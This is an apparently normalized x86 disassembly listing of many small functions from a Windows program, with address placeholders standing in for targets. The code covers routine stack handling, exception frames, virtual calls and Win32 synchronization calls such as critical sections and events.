sub_4238a0
push ebx
mov ebx edx
mov edx ebx
call sub_4236b4
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_423338
sub_42394c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_423aa7
jmp sub_448b58
sub_423b7b
jmp sub_448b58
sub_423b8c
mov eax [ eax - 0x44 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_423bf8
jmp sub_448b58
sub_423bff
pop ebx
mov esp ebp
pop ebp
retn
sub_423c4a
jmp sub_448b58
sub_423c51
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_423cdd
jmp sub_448b58
sub_423ce4
pop ebx
pop ebp
retn
sub_423d2a
jmp sub_448b58
sub_423d31
pop ebx
pop ebp
retn
sub_423d76
jmp sub_448b58
sub_423d7d
pop ebx
pop ebp
retn
sub_423dc7
jmp sub_448b58
sub_423dce
pop esi
pop ebx
pop ebp
retn
sub_423e22
jmp sub_448b58
sub_423e29
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_423f62
jmp sub_448b58
sub_423fde
jmp sub_448b58
sub_4240b4
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_4248a0
sub_4241a4
jmp sub_448b58
sub_424314
jmp sub_448b58
sub_42431b
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4243b2
jmp sub_448b58
sub_4243b9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4243d8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_4243d1
jmp sub_448b58
sub_4243d8
movzx eax [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_424445
jmp sub_448b58
sub_42444c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42453c
jmp sub_448b58
sub_424543
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4481b0
retn
sub_424559
jmp sub_448b58
sub_4245c4
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_424970
xor edx edx
mov eax ebx
call sub_424934
pop ebx
retn
sub_424638
mov eax [ ebp + 0x4 ]
retn
sub_42466e
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4246bc
jmp sub_448b58
sub_4246c3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4246c8
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_4246e0
xor edx edx
call sub_4246e8
retn
sub_4247d4
mov edx [ eax + 0x8 ]
test edx edx
jle r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax [ eax ]
call sub_424674
xor eax eax
retn
mov eax [ eax + 0x4 ]
mov eax [ eax + edx * 4 - 0x4 ]
retn
sub_4249e4
retn
sub_424a9f
jmp sub_448b58
sub_424aa6
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4486e4
sub_424b34
jmp sub_448b58
sub_424b3b
pop ebx
pop ecx
pop ebp
retn
sub_424b7e
jmp sub_448b58
sub_424b85
pop ecx
pop ebp
retn
sub_424bdf
jmp sub_448b58
sub_424be6
pop ebx
pop ecx
pop ebp
retn
sub_424c28
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
retn
sub_424c40
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_424d1b
retn
sub_424dc0
test edx edx
je r-xdata
xor edx edx
call sub_424dd4
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_424e6c
jmp sub_448b58
sub_424e73
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424e90
xchg edx eax
call sub_424dd4
retn
sub_424e98
retn
sub_424f17
jmp sub_448b58
sub_424f1e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4250e5
jmp sub_448b58
sub_4250ec
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_425198
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx ]
call sub_448088
pop esi
pop ebx
retn
sub_42522d
jmp sub_448b58
sub_425234
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425284
xor edx edx
call sub_42515c
retn
sub_425403
jmp sub_448b58
sub_42541c
inc [ eax + 0xc ]
retn
sub_425420
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_42548c
jmp sub_448b58
sub_425498
dec [ eax + 0xc ]
call sub_425420
retn
sub_4254a4
xor eax eax
retn
sub_4254a8
push ebx
mov ebx ecx
mov eax ebx
xor edx edx
call sub_449d2c
pop ebx
retn
sub_425587
jmp sub_448b58
sub_42558e
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4256c0
jmp sub_448b58
sub_4256eb
jmp sub_448b58
sub_4256f2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4257d4
retn
sub_4257d8
retn
sub_425818
retn
sub_42581c
retn
sub_425888
mov eax [ eax + 0x18 ]
retn
sub_42598e
jmp sub_448b58
sub_425995
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4259b2
lea eax [ ebp - 0xc ]
call j_sub_449348
retn
sub_4259ab
jmp sub_448b58
sub_4259b2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425a5f
jmp sub_448b58
sub_425a78
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
inc [ ebx + 0x14 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_425b40
dec [ eax + 0x14 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_425be9
jmp sub_448b58
sub_425bf0
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425bfc
mov eax [ ebp + 0x4 ]
retn
sub_425c32
pop ecx
pop edx
pop esi
pop ebx
retn
sub_425c80
jmp sub_448b58
sub_425c87
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_425d46
jmp sub_448b58
sub_425d4d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425d72
lea eax [ ebp - 0x10 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_425d6b
jmp sub_448b58
sub_425d72
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425d7c
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_425d84
xor eax eax
retn
sub_425dcd
jmp sub_448b58
sub_425dd4
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_425f67
jmp sub_448b58
sub_425f6e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425fec
jmp sub_448b58
sub_425ff3
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4260c3
jmp sub_448b58
sub_4260ca
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426180
jmp sub_448b58
sub_426187
pop ebx
pop ecx
pop ebp
retn
sub_4261d9
jmp sub_448b58
sub_4261e0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4261e8
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x74 ]
pop ebx
retn
sub_4262ae
jmp sub_448b58
sub_4262b5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4262e0
lea eax [ ebp - 0x10 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44b0fc
retn
sub_4262d9
jmp sub_448b58
sub_4262e0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42636c
jmp sub_448b58
sub_426389
jmp sub_448b58
sub_426390
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4263c8
retn
sub_42644b
jmp sub_448b58
sub_426452
mov eax [ ebp - 0x8 ]
call sub_4297cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426477
lea eax [ ebp - 0xc ]
call j_sub_449348
retn
sub_426470
jmp sub_448b58
sub_426477
mov esp ebp
pop ebp
retn
sub_42647c
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x80 ]
pop ebx
retn
sub_4264df
jmp sub_448b58
sub_4264e6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4264ec
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop ebx
retn
sub_4265a5
jmp sub_448b58
sub_4265ac
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4265b4
retn
sub_42662f
jmp sub_448b58
sub_426636
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_426792
jmp sub_448b58
sub_4267c4
jmp sub_448b58
sub_4267cb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426862
jmp sub_448b58
sub_426869
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426997
jmp sub_448b58
sub_42699e
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4269a8
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
movzx eax [ ebx + 0xe ]
pop ebx
retn
mov dx 0x3d
mov eax ebx
call sub_4269c4
sub_426a68
push ebx
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop esi
pop ebx
retn
sub_426adc
push ebx
cmp [ eax + 0x14 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x32 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_426af8
push ebx
cmp [ eax + 0x14 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x3a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_426d34
mov eax [ eax + 0x24 ]
retn
sub_426d38
mov eax [ eax + 0x20 ]
retn
sub_426dd4
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_427088
mov edx sub_427068
mov ecx [ eax ]
call [ ecx + 0xa4 ]
retn
sub_42722b
jmp sub_448b58
sub_427232
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4272f4
retn
sub_4273c6
jmp sub_448b58
sub_4273cd
mov esp ebp
pop ebp
retn
sub_427614
jmp sub_448b58
sub_42761b
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42767c
jmp sub_448b58
sub_427683
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42768c
xor ecx ecx
call sub_427694
retn
sub_4276e4
jmp sub_448b58
sub_4276eb
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42772c
mov eax [ eax + 0x4 ]
call sub_435c14
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_42773c
mov eax [ eax + 0x4 ]
call sub_435c40
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_427778
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_427940
jmp sub_448b58
sub_4279a0
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_427a30
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_427a80
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_427c8e
jmp sub_448b58
sub_427c95
mov esp ebp
pop ebp
retn
sub_427d38
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
retn
sub_427dc0
mov [ eax + 0x18 ] edx
retn
sub_427f74
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_42fb50
retn
sub_427ffb
jmp sub_448b58
sub_428002
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4280d5
jmp sub_448b58
sub_4280dc
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4282ac
jmp sub_448b58
sub_4282fe
jmp sub_448b58
sub_42831d
jmp sub_448b58
sub_428324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428343
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_42833c
jmp sub_448b58
sub_428343
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4283e7
jmp sub_448b58
sub_42846f
jmp sub_448b58
sub_42847c
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
pop ebx
retn
sub_428494
mov eax [ rw-data ]
call sub_42847c
retn
sub_4284cc
push ebx
call sub_42fc40
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_428494
sub_42864a
jmp sub_448b58
sub_428651
mov eax [ ebp - 0x4 ]
add eax 0x80
xor edx edx
call sub_449d2c
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_4287d0
jmp sub_448b58
sub_4287d7
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4288f5
jmp sub_448b58
sub_428912
jmp sub_448b58
sub_428919
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428a14
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_427274
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_428ad8
push ebx
mov ebx eax
mov eax ebx
call sub_42a7b4
cmp al 0x9
sete al
pop ebx
retn
sub_428b70
jmp sub_448b58
sub_428b77
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_428bd2
jmp sub_448b58
sub_428bd9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_428c80
jmp sub_448b58
sub_428c87
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_428f0e
jmp sub_4488a4
sub_428f3a
jmp sub_4488a4
sub_428fdc
jmp sub_4488a4
sub_42907f
jmp sub_4488a4
sub_42925a
jmp sub_4488a4
sub_42929c
jmp sub_448b58
sub_4292cf
jmp sub_448b58
sub_4292d6
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429343
jmp sub_448b58
sub_42941a
jmp sub_448b58
sub_429421
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4296a8
jmp sub_448b58
sub_4296af
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4297c4
mov dl 0x1
call sub_428520
retn
sub_4298d8
jmp sub_448b58
sub_4298df
pop ebx
mov esp ebp
pop ebp
retn
sub_4298e4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_42a8c4
mov eax [ rw-data ]
call sub_42847c
pop ebp
retn
j_sub_4489d0#4
jmp sub_4489d0
j_sub_4489d0#3
jmp sub_4489d0
sub_429b68
jmp sub_448b58
sub_429b6f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429c4f
jmp sub_448b58
sub_429c56
mov esp ebp
pop ebp
retn
sub_429d0e
jmp sub_448b58
sub_429d15
pop ecx
pop ecx
pop ebp
retn
sub_42a071
jmp sub_448b58
sub_42a078
pop ebx
mov esp ebp
pop ebp
retn
sub_42a329
jmp sub_448b58
sub_42a330
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_4481b0
retn
sub_42a34c
jmp sub_448b58
sub_42a370
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4488a4
sub_42a3a7
jmp sub_4488a4
sub_42a3e6
jmp sub_448b58
sub_42a3ed
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a40f
lea eax [ ebp - 0x30 ]
mov edx 0x6
call j_sub_44936c
retn
sub_42a408
jmp sub_448b58
sub_42a40f
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a499
jmp sub_4488a4
sub_42a4c6
jmp sub_448b58
sub_42a4cd
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42a4d8
push ecx
mov edx esp
mov ecx 0x4
call sub_428a50
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_42847c
sub_42a57e
jmp sub_448b58
sub_42a585
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42a665
jmp sub_448b58
sub_42a66c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a7a4
jmp sub_448b58
sub_42a7ab
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a804
jmp sub_448b58
sub_42a80b
pop ebx
pop ecx
pop ebp
retn
sub_42aa69
jmp sub_448b58
sub_42aa70
pop ecx
pop ecx
pop ebp
retn
sub_42aab1
jmp sub_448b58
sub_42aab8
pop ebx
pop ecx
pop ebp
retn
sub_42ab54
jmp sub_448b58
sub_42ab5b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ac09
jmp sub_448b58
sub_42ac10
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ac1c
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_42ae77
jmp sub_448b58
sub_42ae7e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42aea3
mov eax [ ebp - 0x10 ]
call sub_4481b0
mov eax [ ebp - 0xc ]
call sub_4481b0
retn
sub_42ae9c
jmp sub_448b58
sub_42aea3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42aec8
lea eax [ ebp - 0x8 ]
call sub_44b8d8
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_42aec1
jmp sub_448b58
sub_42aec8
pop ebx
mov esp ebp
pop ebp
retn
sub_42b0f2
jmp sub_448b58
sub_42b0f9
pop ebx
mov esp ebp
pop ebp
retn
sub_42b12c
mov eax [ eax + 0x30 ]
call sub_424590
retn
sub_42b1e4
call sub_42b314
retn
sub_42b228
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_427dc0
mov [ ebx + 0x1c ] esi
pop esi
pop ebx
retn
sub_42b303
jmp sub_448b58
sub_42b30a
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_42b314
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_427500
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_42b32c
test dl dl
je r-xdata
mov dl 0x8
call sub_42d794
retn
mov dl 0x9
call sub_42d794
retn
sub_42b383
jmp sub_448b58
sub_42b38a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42b3d3
jmp sub_448b58
sub_42b3da
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42b472
jmp sub_448b58
sub_42b479
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42b617
jmp sub_448b58
sub_42b61e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b916
jmp sub_448b58
sub_42b958
jmp sub_448b58
sub_42b9be
jmp sub_448b58
sub_42b9c5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42bc4c
mov dl 0x1
call sub_42d794
retn
sub_42bc54
xor edx edx
call sub_42d794
retn
sub_42bd53
jmp sub_448b58
sub_42bd6c
test eax eax
je r-xdata
xor eax eax
retn
test ecx ecx
je r-xdata
mov ecx [ ecx ]
mov eax ecx
mov edx [ edx ]
xchg edx eax
call sub_448428
retn
sub_42bf0f
jmp sub_448b58
sub_42bf16
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42c0e4
jmp sub_448b58
sub_42c0eb
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42c1c1
jmp sub_448b58
sub_42c1c8
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_42c2c7
jmp sub_448b58
sub_42c2ce
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_42c35f
jmp sub_448b58
sub_42c366
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_42c51f
jmp sub_448b58
sub_42c526
pop ebx
pop ecx
pop ebp
retn
sub_42c5b2
jmp sub_448b58
sub_42c5b9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42c620
jmp sub_448b58
sub_42c627
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42c6a7
jmp sub_448b58
sub_42c6ae
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c6cb
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_42c6c4
jmp sub_448b58
sub_42c6cb
pop ebx
pop ecx
pop ebp
retn
sub_42c7ba
jmp sub_448b58
sub_42c7c1
pop ebx
pop ecx
pop ebp
retn
sub_42c8ae
jmp sub_448b58
sub_42c8b5
pop ecx
pop ecx
pop ebp
retn
sub_42c8bc
mov cl 0x1
test eax eax
je r-xdata
xor ecx ecx
cmp edx eax
je r-xdata
mov eax ecx
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
sub_42c9c5
jmp sub_448b58
sub_42c9cc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42cb90
jmp sub_448b58
sub_42cc0f
jmp sub_448b58
sub_42cc16
pop ebx
mov esp ebp
pop ebp
retn
sub_42cce9
jmp sub_448b58
sub_42ccf0
pop ebx
mov esp ebp
pop ebp
retn
sub_42cd8a
jmp sub_448b58
sub_42cd91
pop ebx
mov esp ebp
pop ebp
retn
sub_42cdf1
jmp sub_448b58
sub_42cdf8
mov esp ebp
pop ebp
retn
sub_42d251
jmp sub_448b58
sub_42d2ab
jmp sub_448b58
sub_42d2bc
jmp sub_4488a4
sub_42d315
jmp sub_448b58
sub_42d31c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42d37a
jmp sub_448b58
sub_42d381
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42d388
mov edx rw-data
mov ecx 0x4
call sub_42b240
retn
sub_42d445
jmp sub_448b58
sub_42d44c
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42d573
jmp sub_448b58
sub_42d57a
pop ebx
mov esp ebp
pop ebp
retn
sub_42d6a8
jmp sub_448b58
sub_42d6af
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42d77f
jmp sub_448b58
sub_42d786
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42d78c
call sub_42d580
retn
sub_42d898
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventW
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_43ba38
sub_42d8cc
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_42d94c
jmp sub_448b58
sub_42d964
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_42d970
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_42d964
sub_42d98c
mov eax [ rw-data ]
push eax
call SetEvent
retn
sub_42d998
push rw-data
call InterlockedIncrement
retn
sub_42d9a4
push rw-data
call InterlockedDecrement
retn
sub_42dad6
jmp sub_4488a4
sub_42db15
jmp sub_448b58
sub_42db73
jmp sub_448b58
sub_42db7a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42db99
push rw-data
call LeaveCriticalSection
retn
sub_42db92
jmp sub_448b58
sub_42db99
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42dbf3
jmp sub_4488a4
sub_42dd3a
jmp sub_448b58
sub_42dd41
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_42dde0
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
cmp [ eax + 0x3c ] 0x0
jne r-xdata
call sub_42e16c
sub_42de62
jmp sub_448b58
sub_42de69
pop ebx
mov esp ebp
pop ebp
retn
sub_42de88
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_42de9c
cmp [ eax + 0x1a ] 0x0
je r-xdata
retn
push eax
push sub_42de88
call sub_42e138
sub_42df63
jmp sub_448b58
sub_42df6a
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_42e0cb
jmp sub_448b58
sub_42e0ea
jmp sub_448b58
sub_42e111
jmp sub_448b58
sub_42e194
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov [ eax + 0xd ] 0x1
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
sub_42e348
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_42e534
sub_42e3a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_429714
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_42e3bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_429714
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_42e3d0
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_42bb80
retn
sub_42e3dc
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_42bb80
retn
sub_42e6a8
xor eax eax
retn
sub_42e6ac
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_42e6b4
xor eax eax
retn
sub_42e6b8
retn
sub_42e6bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_449d2c
pop esi
pop ebx
retn
sub_42e6d0
mov eax [ eax + 0x4 ]
retn
sub_42e6d4
retn
sub_42e6d8
xor eax eax
retn
sub_42e6dc
retn
sub_42e6e0
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_42e6ec
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_42e6f8
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_42e704
retn
sub_42e708
xchg edx eax
call sub_4292e8
retn
sub_42e710
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_42e798
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_4483f8
pop esi
retn
sub_42e7ac
retn
sub_42e890
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_449d2c
pop esi
pop ebx
retn
sub_42e8d0
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_42e9fc
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_448444
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_42ea14
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_42ea9c
retn
sub_42eae4
retn
sub_42eb1c
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_42eb34
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_42ed68
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_4483f8
pop esi
pop ebx
retn
sub_42eb7c
mov al 0x1
retn
sub_42eb80
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_42eb88
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_42ec40
xor eax eax
retn
sub_42ec44
retn
sub_42ec70
retn
sub_42ed08
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_42ed1c
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_424590
retn
sub_42ee67
